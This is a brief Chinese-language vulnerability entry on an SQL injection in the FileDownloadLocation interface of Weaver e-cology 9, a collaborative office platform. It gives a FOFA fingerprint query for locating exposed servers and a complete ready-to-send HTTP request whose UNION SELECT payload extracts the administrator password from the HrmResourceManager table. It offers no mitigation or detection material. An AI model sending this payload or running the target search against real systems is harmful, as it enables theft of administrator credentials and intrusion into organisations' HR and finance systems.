# 泛微e-cology9系统接口FileDownloadLocation接口存在SQL注入漏洞
泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。泛微e-cology 9 x.FileDownloadLocation接口存在SQL注入漏洞

## fofa
```javascript
body="doCheckPopupBlocked"
```

## poc
```javascript
GET /weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation?ddcode=7ea7ef3c41d67297&downfiletype=eml&download=1&mailId=1123+union+select+*+from+(select+1+as+resourceid,'../ecology/WEB-INF/prop/mobilemode.properties'+as+x2,'3'+as+x3,(select++*+from+(select+*+from+(select+password+from+HrmResourceManager+where+id=1)x)x)+as+x4,5+as+x5,6+as+x6)x+where+1=1&mailid=action.WorkflowFnaEffectNew&parentid=0 HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate, br, zstd
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.0.0 Safari/537.36
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1734313084568-1d1365df-db66-42e7-b2ca-15e8f0de17bb.png)

